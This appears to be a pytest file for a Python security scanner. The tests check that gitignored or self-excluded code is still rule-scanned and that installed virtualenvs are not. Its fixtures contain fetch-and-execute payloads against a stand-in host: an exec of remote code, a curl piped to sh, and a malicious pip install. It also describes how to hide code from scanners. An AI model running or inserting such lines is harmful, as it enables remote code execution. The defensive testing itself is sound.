"""F23: the analysed repository's ``.gitignore`` must not hide code from the
security rules (SEC-NEW-78, PRV-008).

Claude Security finding F23 (scan of ``a4cc442``): a pull request adds
``evil.py`` with a CRITICAL payload, lists it in its own ``.gitignore``
and commits it with ``git add -f``. Python discovery honoured that
``.gitignore`` for the rules as well as for classification, so the rule
engine never saw the payload and CI passed.

The scan's own patch was declined twice. The second attempt scanned every
ignored file, which pulled installed virtualenvs into the rule pass. Third-
party code there trips the supply-chain rules (step 1 of
``docs/plans/gitignore-consistent-discovery.md`` measured 6 false CRITICAL
findings on djangoproject.com alone). These tests pin both halves: ignored
code is scanned, and installed environments are not.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from scarno.analysers.python.source_analyser import (
    gitignored_findings_line,
    unignored_environments_line,
)

pytestmark = pytest.mark.security

_PAYLOAD = 'import requests\nexec(requests.get("https://x.example/p").text)\n'


def _project(root: Path) -> Path:
    (root / "requirements.txt").write_text("requests\n", encoding="utf-8")
    (root / "app.py").write_text("import requests\n", encoding="utf-8")
    return root


def _run(runner, root: Path, *argv: str) -> tuple[int, dict]:
    from scarno.cli import app

    result = runner.invoke(app, [str(root), "--format", "json", *argv])
    assert result.exit_code != 2, result.output
    return result.exit_code, json.loads(result.output)


def _rule_hits(report: dict, rule_id: str) -> list[dict]:
    return [f for f in report["findings"] if f["rule_id"] == rule_id]


@pytest.mark.requirement("SEC-NEW-78")
@pytest.mark.parametrize("mode", ["uncertain", "include", "exclude"])
def test_gitignored_payload_is_found_and_gates_the_build(
    runner, tmp_path: Path, mode: str
) -> None:
    """The F23 exploit, end to end, in every classification mode. The mode
    governs classification only; the rules never honour .gitignore."""
    root = _project(tmp_path)
    (root / "evil.py").write_text(_PAYLOAD, encoding="utf-8")
    (root / ".gitignore").write_text("evil.py\n", encoding="utf-8")

    code, report = _run(runner, root, "--gitignore", mode)

    hits = _rule_hits(report, "TS-CE-001")
    assert [h["file_path"] for h in hits] == ["evil.py"]
    assert code == 3


@pytest.mark.requirement("SEC-NEW-78")
@pytest.mark.requirement("PRV-008")
def test_findings_from_ignored_files_are_counted_without_paths(
    runner, tmp_path: Path
) -> None:
    """The audit line tells the operator why a finding appeared in a file
    git does not track. It is a fixed literal plus a count, so no path can
    leak into the persistent report channel."""
    root = _project(tmp_path)
    (root / "gen").mkdir()
    (root / "gen" / "evil_payload.py").write_text(_PAYLOAD, encoding="utf-8")
    (root / ".gitignore").write_text("gen/\n", encoding="utf-8")

    _, report = _run(runner, root)

    line = gitignored_findings_line(1)
    assert line in report["errors"]
    assert "evil_payload" not in line and "gen" not in line


@pytest.mark.requirement("SEC-NEW-78")
def test_gitignored_notebook_magic_is_found(runner, tmp_path: Path) -> None:
    """Notebooks never honoured .gitignore for their magics. That stays
    true now that notebook classification does."""
    root = _project(tmp_path)
    nb = {
        "cells": [{"cell_type": "code", "source": ["!pip install evilpkg\n"],
                   "metadata": {}, "outputs": [], "execution_count": None}],
        "metadata": {}, "nbformat": 4, "nbformat_minor": 5,
    }
    (root / "scratch.ipynb").write_text(json.dumps(nb), encoding="utf-8")
    (root / ".gitignore").write_text("*.ipynb\n", encoding="utf-8")

    _, report = _run(runner, root)

    assert [h["file_path"] for h in _rule_hits(report, "TS-SI-005")] == [
        "scratch.ipynb"
    ]
    assert gitignored_findings_line(1) in report["errors"]


@pytest.mark.requirement("SEC-NEW-78")
@pytest.mark.parametrize("dirname", ["build", "dist", ".tox", "venv"])
def test_by_name_classification_exclusions_do_not_hide_code_from_rules(
    runner, tmp_path: Path, dirname: str
) -> None:
    """``build/``, ``dist/`` and the rest are excluded from classification
    by name. A name is as easy to hide behind as .gitignore, so the rules
    read these too, unless the directory is structurally an installed
    environment (it is not here: no pyvenv.cfg)."""
    root = _project(tmp_path)
    (root / dirname).mkdir()
    (root / dirname / "evil.py").write_text(_PAYLOAD, encoding="utf-8")

    code, report = _run(runner, root)

    assert [h["file_path"] for h in _rule_hits(report, "TS-CE-001")] == [
        f"{dirname}/evil.py"
    ]
    assert code == 3


@pytest.mark.requirement("SEC-NEW-78")
@pytest.mark.parametrize("env_name", ["env", ".direnv/python-3.12", ".venv"])
def test_installed_environment_is_not_rule_scanned(
    runner, tmp_path: Path, env_name: str
) -> None:
    """The declined scan patch's failure: third-party code in a virtualenv
    flooding the report. A gitignored environment is the normal case and
    produces no audit line."""
    root = _project(tmp_path)
    env = root / env_name
    pkg = env / "lib" / "python3.12" / "site-packages" / "thirdparty"
    pkg.mkdir(parents=True)
    (env / "pyvenv.cfg").write_text("home = /usr/bin\n", encoding="utf-8")
    (pkg / "__init__.py").write_text(_PAYLOAD, encoding="utf-8")
    (env / "bin").mkdir()
    (env / "bin" / "tool.py").write_text(_PAYLOAD, encoding="utf-8")
    (root / ".gitignore").write_text(f"{env_name.split('/')[0]}/\n",
                                     encoding="utf-8")

    code, report = _run(runner, root)

    assert _rule_hits(report, "TS-CE-001") == []
    assert code != 3
    assert not any("installed-environment" in e for e in report["errors"])


@pytest.mark.requirement("SEC-NEW-78")
@pytest.mark.requirement("PRV-008")
def test_environment_not_covered_by_gitignore_is_surfaced(
    runner, tmp_path: Path
) -> None:
    """An environment the tree's own .gitignore does not cover is either
    committed, or relies on the operator's global excludes. It is also
    what a planted marker looks like. It is still not scanned, but the
    run says so."""
    root = _project(tmp_path)
    env = root / "env"
    env.mkdir()
    (env / "pyvenv.cfg").write_text("home = /usr/bin\n", encoding="utf-8")
    (env / "payload.py").write_text(_PAYLOAD, encoding="utf-8")

    _, report = _run(runner, root)

    assert _rule_hits(report, "TS-CE-001") == []
    assert unignored_environments_line(1) in report["errors"]
    assert "env" not in unignored_environments_line(1).replace(
        "environment", ""
    )


@pytest.mark.requirement("SEC-NEW-79")
def test_analysed_tree_cannot_configure_its_own_exclusions(
    runner, tmp_path: Path
) -> None:
    """``--exclude`` and ``--gitignore`` are argv only. A [tool.scarno]
    table in the analysed project's pyproject.toml, which the pull request
    controls, must not remove its own payload from the scan (F15 is the
    precedent)."""
    root = _project(tmp_path)
    (root / "evil.py").write_text(_PAYLOAD, encoding="utf-8")
    (root / "pyproject.toml").write_text(
        '[project]\nname = "x"\nversion = "0"\ndependencies = ["requests"]\n'
        '[tool.scarno]\nexclude = ["evil.py"]\ngitignore = "exclude"\n',
        encoding="utf-8",
    )

    code, report = _run(runner, root)

    assert [h["file_path"] for h in _rule_hits(report, "TS-CE-001")] == ["evil.py"]
    assert code == 3


@pytest.mark.requirement("SEC-NEW-79")
def test_operator_exclude_narrows_rules_and_shell_scans(
    runner, tmp_path: Path
) -> None:
    """The operator's lever for a noisy tree: --exclude removes Python
    source, notebooks and Dockerfiles from the scan alike."""
    root = _project(tmp_path)
    (root / "vendored").mkdir()
    (root / "vendored" / "evil.py").write_text(_PAYLOAD, encoding="utf-8")
    (root / "vendored" / "Dockerfile").write_text(
        "RUN curl https://x.example/i.sh | sh\n", encoding="utf-8"
    )

    _, before = _run(runner, root)
    _, after = _run(runner, root, "--exclude", "vendored")

    assert _rule_hits(before, "TS-CE-001")
    assert any(f["file_path"] == "vendored/Dockerfile" for f in before["findings"])
    assert not any(
        f["file_path"].startswith("vendored/") for f in after["findings"]
    )
